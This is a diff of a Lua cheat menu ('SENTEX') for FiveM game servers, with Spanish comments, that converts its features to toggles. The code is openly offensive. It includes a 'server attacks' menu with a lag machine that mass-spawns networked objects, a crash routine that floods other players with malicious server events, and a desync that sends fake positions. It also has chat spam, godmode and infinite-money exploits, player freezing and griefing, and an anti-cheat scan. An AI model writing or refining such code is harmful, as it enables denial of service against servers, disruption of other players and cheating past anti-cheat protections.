@@ -1,7 +1,5 @@
 --[[
-    SENTEX MODULES v3.7
-    Contiene todas las acciones y la configuración de los menús.
-    Se integra con core.lua (sistema de menú).
+    SENTEX MODULES v3.7 - Con soporte para toggles ON/OFF
 ]]
 
 local _r = math.random
@@ -73,7 +71,6 @@ local function _scanAC()
     end
 end
 
--- Hacer visible para otros módulos (opcional)
 _G._acDetected = _acDetected
 
 -- ============================================================================
@@ -110,10 +107,9 @@ local function _revivirQB()
     end
 end
 
--- Noclip (completo)
+-- Noclip (ahora controlado por toggle)
 local _noclipActivo = false
 local _noclipVel = 5.0
-local _boostMult = 3.0
 
 local function _camVectors()
     local rot = GetGameplayCamRot(2)
@@ -148,16 +144,7 @@ local function _disableNoclip()
     Notify("~r~Noclip DESACTIVADO")
 end
 
-local function _toggleNoclip()
-    if _noclipActivo then
-        _disableNoclip()
-    else
-        _noclipActivo = true
-        Notify("~b~Noclip ACTIVADO")
-    end
-end
-
--- Hilo noclip (se ejecuta siempre)
+-- Hilo noclip (se ejecuta siempre, pero solo actúa si _noclipActivo es true)
 Citizen.CreateThread(function()
     while true do
         if _noclipActivo then
@@ -229,10 +216,11 @@ local function _tuneVehicleMax(veh)
     end
 end
 
+-- Shift Boost toggle
 local _shiftBoostActive = false
-local function _toggleShiftBoost()
-    _shiftBoostActive = not _shiftBoostActive
-    if _shiftBoostActive then
+local function _toggleShiftBoost(val)
+    _shiftBoostActive = val
+    if val then
         Notify("~g~Shift Boost ACTIVADO (mantén SHIFT)")
     else
         Notify("~r~Shift Boost DESACTIVADO")
@@ -303,7 +291,7 @@ local function _cargarVeh()
     local p = PlayerPedId()
     local camPos = GetGameplayCamCoord()
     local camRot = GetGameplayCamRot(2)
-    local dir = _rotToDir(camRot)  -- definida más abajo
+    local dir = _rotToDir(camRot)
     local dest = vec3(camPos.x+dir.x*10.0, camPos.y+dir.y*10.0, camPos.z+dir.z*10.0)
     local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, p, 0)
     local _, hit, _, _, ent = GetShapeTestResult(ray)
@@ -381,7 +369,6 @@ end
 
 local _attachAllNearbyVehicles
 local _detachAllVehicles
--- (se definen más abajo)
 
 -- ============================================================================
 --                         ACCIONES JUGADORES (LISTA)
@@ -405,7 +392,6 @@ local function _nombreJugador(pid)
     return "Jugador "..pid
 end
 
--- Revivir a otro jugador
 local function _revivirJugador(pid)
     local targetPed = GetPlayerPed(pid)
     if not targetPed or targetPed == 0 then Notify("~r~Jugador no encontrado") return end
@@ -752,47 +738,53 @@ local function _framingAttack(pid)
 end
 
 -- ============================================================================
---                      SERVER ATTACKS (PRUEBAS) - CORREGIDO
+--                      SERVER ATTACKS (PRUEBAS) - CON TOGGLES
 -- ============================================================================
 local _lagEntidades = false
 local _lagThread = nil
-local function _startLagMachine()
-    if _lagEntidades then
-        _lagEntidades = false
-        Notify("~r~Máquina de lag desactivada")
-        return
-    end
-    _lagEntidades = true
-    Notify("~y~Máquina de lag ACTIVADA (spawnea objetos cada frame) - solo para pruebas")
-    _lagThread = Citizen.CreateThread(function()
-        local counter = 0
-        while _lagEntidades do
-            local ped = PlayerPedId()
-            local pos = GetEntityCoords(ped)
-            for i = 1, 5 do
-                local obj = CreateObject(GetHashKey("prop_roadcone01a"), pos.x + math.random(-20,20), pos.y + math.random(-20,20), pos.z, true, true, false)
-                if obj and obj ~= 0 then
-                    NetworkRegisterEntityAsNetworked(obj)
-                    SetEntityAsMissionEntity(obj, true, true)
-                    SetEntityCollision(obj, false, false)
-                    Citizen.Wait(0)
-                end
-                counter = counter + 1
-                if counter > 500 then
-                    local pool = GetGamePool("CObject")
-                    if #pool > 300 then
-                        for _, o in ipairs(pool) do
-                            if DoesEntityExist(o) and not IsEntityAPed(o) and not IsEntityAVehicle(o) then
-                                DeleteEntity(o)
+local function _toggleLagMachine(val)
+    if val then
+        if _lagEntidades then return end
+        _lagEntidades = true
+        Notify("~y~Máquina de lag ACTIVADA (spawnea objetos cada frame)")
+        _lagThread = Citizen.CreateThread(function()
+            local counter = 0
+            while _lagEntidades do
+                local ped = PlayerPedId()
+                local pos = GetEntityCoords(ped)
+                for i = 1, 5 do
+                    local obj = CreateObject(GetHashKey("prop_roadcone01a"), pos.x + math.random(-20,20), pos.y + math.random(-20,20), pos.z, true, true, false)
+                    if obj and obj ~= 0 then
+                        NetworkRegisterEntityAsNetworked(obj)
+                        SetEntityAsMissionEntity(obj, true, true)
+                        SetEntityCollision(obj, false, false)
+                        Citizen.Wait(0)
+                    end
+                    counter = counter + 1
+                    if counter > 500 then
+                        local pool = GetGamePool("CObject")
+                        if #pool > 300 then
+                            for _, o in ipairs(pool) do
+                                if DoesEntityExist(o) and not IsEntityAPed(o) and not IsEntityAVehicle(o) then
+                                    DeleteEntity(o)
+                                end
+                                counter = 0
                             end
-                            counter = 0
                         end
                     end
                 end
+                _w(0)
             end
-            _w(0)
+        end)
+    else
+        if not _lagEntidades then return end
+        _lagEntidades = false
+        Notify("~r~Máquina de lag DESACTIVADA")
+        if _lagThread then
+            Citizen.Wait(100)
+            _lagThread = nil
         end
-    end)
+    end
 end
 
 local function _freezePlayer(pid)
@@ -809,16 +801,13 @@ local function _freezePlayer(pid)
     end
 end
 
--- CRASH ATTEMPT CORREGIDO (sin overflow)
 local function _crashAttempt(pid)
     local targetId = GetPlayerServerId(pid)
     if not targetId then Notify("~r~No se pudo obtener Server ID") return end
     Notify("~y~Intentando crash a ".._nombreJugador(pid).." (eventos maliciosos)")
-    -- Enviar muchos eventos, pero con tamaños moderados (máx 500 caracteres)
     for i = 1, 200 do
         TriggerServerEvent("__internal_crash_"..tostring(i), string.rep("A", 500))
         TriggerServerEvent("chat:addMessage", {args = {string.rep("x", 500)}})
-        -- playerSpawn es muy sensible, lo enviamos con tamaño seguro (250)
         if i % 10 == 0 then
             TriggerServerEvent("playerSpawn", string.rep("x", 250))
         end
@@ -828,23 +817,23 @@ local function _crashAttempt(pid)
 end
 
 local _desyncTarget = nil
-local function _startDesync(pid)
-    if _desyncTarget then
+local function _toggleDesync(pid)
+    if _desyncTarget == pid then
         _desyncTarget = nil
         Notify("~r~Desync detenido")
-        return
+    else
+        _desyncTarget = pid
+        Notify("~y~Desync activado contra ".._nombreJugador(pid))
+        Citizen.CreateThread(function()
+            while _desyncTarget == pid do
+                local fakePos = vector3(math.random(-5000,5000), math.random(-5000,5000), math.random(-500,500))
+                TriggerServerEvent("updateCoords", fakePos.x, fakePos.y, fakePos.z)
+                TriggerServerEvent("playerSpawned", fakePos)
+                TriggerServerEvent("esx:updatePosition", fakePos)
+                _w(10)
+            end
+        end)
     end
-    _desyncTarget = pid
-    Notify("~y~Desync activado contra ".._nombreJugador(pid))
-    Citizen.CreateThread(function()
-        while _desyncTarget == pid do
-            local fakePos = vector3(math.random(-5000,5000), math.random(-5000,5000), math.random(-500,500))
-            TriggerServerEvent("updateCoords", fakePos.x, fakePos.y, fakePos.z)
-            TriggerServerEvent("playerSpawned", fakePos)
-            TriggerServerEvent("esx:updatePosition", fakePos)
-            _w(10)
-        end
-    end)
 end
 
 local function _testGodmodeExploit()
@@ -871,20 +860,22 @@ local function _testMoneyExploit()
 end
 
 local _chatSpamActive = false
-local function _startChatSpam()
-    if _chatSpamActive then
+local function _toggleChatSpam(val)
+    if val then
+        if _chatSpamActive then return end
+        _chatSpamActive = true
+        Notify("~y~Chat spam ACTIVADO (inunda el chat)")
+        Citizen.CreateThread(function()
+            while _chatSpamActive do
+                TriggerServerEvent("chat:addMessage", {args = {"[SPAM]", string.rep("A", 200)}})
+                _w(0)
+            end
+        end)
+    else
+        if not _chatSpamActive then return end
         _chatSpamActive = false
-        Notify("~r~Chat spam desactivado")
-        return
+        Notify("~r~Chat spam DESACTIVADO")
     end
-    _chatSpamActive = true
-    Notify("~y~Chat spam ACTIVADO (inunda el chat)")
-    Citizen.CreateThread(function()
-        while _chatSpamActive do
-            TriggerServerEvent("chat:addMessage", {args = {"[SPAM]", string.rep("A", 200)}})
-            _w(0)
-        end
-    end)
 end
 
 -- ============================================================================
@@ -1015,13 +1006,13 @@ local function crearAccionPlayer(pid, tipo)
         elseif tipo == "attachdildo" then _attachDildoToPlayer(pid)
         elseif tipo == "freeze" then _freezePlayer(pid)
         elseif tipo == "crash" then _crashAttempt(pid)
-        elseif tipo == "desync" then _startDesync(pid)
+        elseif tipo == "desync" then _toggleDesync(pid)
         end
     end
 end
 
 -- ============================================================================
---                    REGISTRO DE MENÚS ESTÁTICOS
+--                    REGISTRO DE MENÚS ESTÁTICOS (CON TOGGLES)
 -- ============================================================================
 RegisterMenuModule("main", {
     {nombre="[»] Self options", submenu="self", desc="Opciones del jugador"},
@@ -1037,7 +1028,14 @@ RegisterMenuModule("self", {
     {nombre="• Curar", accion=_curar, desc="Restaura salud y armadura"},
     {nombre="• Revivir ESX", accion=_revivirESX, desc="Resucita en servidores ESX"},
     {nombre="• Revivir QB", accion=_revivirQB, desc="Resucita en servidores QB/QC"},
-    {nombre="• Noclip", accion=_toggleNoclip, desc="Atraviesa paredes. WASD, Shift (boost), Espacio/Ctrl"},
+    {nombre="• Noclip", toggle=true, toggleValue=_noclipActivo, onToggle=function(val)
+        _noclipActivo = val
+        if val then
+            Notify("~b~Noclip ACTIVADO")
+        else
+            _disableNoclip()
+        end
+    end, desc="Atraviesa paredes. WASD, Shift (boost), Espacio/Ctrl (toggle)"},
 })
 
 RegisterMenuModule("vehicle", {
@@ -1047,7 +1045,7 @@ RegisterMenuModule("vehicle", {
     {nombre="• Lanzar vehículo", accion=_lanzarVeh, desc="Lanza el cargado"},
     {nombre="• Reparar", accion=function() _repararVeh() end, desc="Repara tu vehículo"},
     {nombre="• Tunear al máximo", accion=function() _tuneVehicleMax() end, desc="Mejora completa"},
-    {nombre="• Shift Boost", accion=_toggleShiftBoost, desc="Aceleración extra con SHIFT"},
+    {nombre="• Shift Boost", toggle=true, toggleValue=_shiftBoostActive, onToggle=_toggleShiftBoost, desc="Aceleración extra con SHIFT (toggle)"},
     {nombre="• Enganchar todos (100m)", accion=_attachAllNearbyVehicles, desc="Engancha todos los vehículos cercanos"},
     {nombre="• Soltar todos", accion=_detachAllVehicles, desc="Desengancha todos"},
     {nombre="• Voltear", accion=function() _flipVeh() end, desc="Voltea el vehículo"},
@@ -1073,8 +1071,8 @@ RegisterMenuModule("event_hunter", {
 })
 
 RegisterMenuModule("server_attacks", {
-    {nombre="• Máquina de lag (spawn objetos)", accion=_startLagMachine, desc="Activa/desactiva lag masivo"},
-    {nombre="• Chat spam (inunda chat)", accion=_startChatSpam, desc="Activa/desactiva spam de chat"},
+    {nombre="• Máquina de lag (spawn objetos)", toggle=true, toggleValue=_lagEntidades, onToggle=_toggleLagMachine, desc="Activa/desactiva lag masivo (toggle)"},
+    {nombre="• Chat spam (inunda chat)", toggle=true, toggleValue=_chatSpamActive, onToggle=_toggleChatSpam, desc="Activa/desactiva spam de chat (toggle)"},
     {nombre="• Test Godmode exploit", accion=_testGodmodeExploit, desc="Prueba bypass de godmode"},
     {nombre="• Test Money exploit", accion=_testMoneyExploit, desc="Intenta generar dinero infinito"},
     {nombre="• Congelar jugador", accion=function()
@@ -1087,11 +1085,11 @@ RegisterMenuModule("server_attacks", {
         _G.MenuCurrent = "player_list"
         _G.MenuOption = 1
     end, desc="Intenta crashear a un jugador"},
-    {nombre="• Desync player", accion=function()
+    {nombre="• Desync player (toggle)", accion=function()
         Notify("~y~Selecciona jugador desde Player List")
         _G.MenuCurrent = "player_list"
         _G.MenuOption = 1
-    end, desc="Envía posiciones falsas constantemente"},
+    end, desc="Activa/desactiva desync contra jugador (toggle)"},
 })
 
 -- ============================================================================
@@ -1153,7 +1151,7 @@ local function refreshPlayerList()
                 {nombre="• Enganchar nepe", accion=crearAccionPlayer(pid,"attachdildo"), desc="Le engancha un dildo en la cara (persistente)"},
                 {nombre="• Congelar (desync)", accion=crearAccionPlayer(pid,"freeze"), desc="Congela al jugador temporalmente"},
                 {nombre="• Crash intent", accion=crearAccionPlayer(pid,"crash"), desc="Intenta crashear al jugador"},
-                {nombre="• Desync (posiciones)", accion=crearAccionPlayer(pid,"desync"), desc="Activa desync constante (toggle)"},
+                {nombre="• Desync (toggle)", accion=crearAccionPlayer(pid,"desync"), desc="Activa/desactiva desync constante (toggle)"},
             }
             RegisterMenuModule(submenuName, dynamicSubmenus[submenuName])
         end
@@ -1174,4 +1172,4 @@ end)
 refreshVehicleList()
 refreshPlayerList()
 
-Notify("~g~[SENTEX] Módulos cargados correctamente.")
+Notify("~g~[SENTEX] Módulos cargados correctamente (con toggles y nuevo diseño).")
